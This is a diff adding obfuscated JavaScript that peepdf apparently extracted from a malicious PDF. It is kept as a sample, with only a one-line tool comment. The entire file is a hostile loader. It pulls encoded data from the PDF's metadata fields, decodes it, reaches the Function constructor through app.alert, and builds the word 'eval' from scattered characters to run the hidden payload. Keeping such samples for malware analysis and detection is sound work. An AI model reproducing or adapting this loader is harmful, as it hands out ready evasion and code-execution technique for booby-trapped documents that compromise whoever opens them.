@@ -1,0 +1,91 @@
+// peepdf comment: Javascript code located in object 99 (version 1)
+
+function rhjahahagk() {
+    var asfafa = info;
+    var ss = asfafa.author;
+    var hgh = asfafa.keywords;
+
+    function dec(input2) {
+        var asfdsad;
+        var asdf = Fde(input2);
+        var asfdsad = hex2a(asdf);
+        return asfdsad;
+    }
+
+    function Fde(str) {
+        var set = '';
+        var s = '';
+        var ee = '';
+        str = str.replace(/G/g, ",");
+        str = str.split(",");
+        for (var i = 0; i < str.length; i++) {
+            ee = str[i] / 3;
+            set += asdfqwef(ee.toString(16));
+        }
+        return set;
+    }
+    var ded = info.creator;
+
+    function asdfewawea(sa) {
+        var ses = sa;
+        return ses;
+    }
+
+    function ertenbui45(s) {
+        var adsfawheu = "0";
+        return adsfawheu + asdfewawea(s);
+    }
+
+    function asdfqwef(eds) {
+        var set = '';
+        var s = eds;
+        if (s.length < 2) {
+            set = ertenbui45(s);
+        } else {
+            set = s;
+        }
+        return set;
+    }
+    var ttty = info["subject"];
+
+    function qwaerasdf(asd) {
+        return String.fromCharCode(asd);
+    }
+
+    function hex2a(hex) {
+        var str = '';
+        var zzz = qwaerasdf;
+        for (var i = 0; i < hex.length; i += 2) {
+            var sssss = hex.substr(i, 2);
+            str += qwaerasdf('asdfwefwuiegfyuadsui0x'.substr(20, 2) + sssss);
+        }
+        return str;
+    }
+    ss += ttty + hgh;
+    var dad = info.producer;
+
+    function adsfquifhiwuf(d, dd) {
+        return d + dd;
+    }
+    ss += adsfquifhiwuf(ded, dad);
+    var ss = dec(ss);
+    var dfawlfnewiojfiopwef = app.alert["adsfwefafdsfwefconstructorasdfwefasdf".substr(15, 11)];
+
+    function asdfeaf(s) {
+        if (s == 0) {
+            return false
+        } else {
+            return true
+        }
+    }
+    var susea = asdfeaf(1) + "";
+    var seasus = asdfeaf(0) + "";
+    var daeaefe = "eafadsfjekafhjkavadfefafaef";
+    var dudilda = susea[(3 + 3) / 2];
+    dudilda += daeaefe[(16 + 16) / 2];
+    dudilda += seasus[((1 + 9) / 5) - 1];
+    dudilda += seasus[(2 + 10) / 6];
+    dfawlfnewiojfiopwef[dudilda](ss);
+}
+rhjahahagk();
+
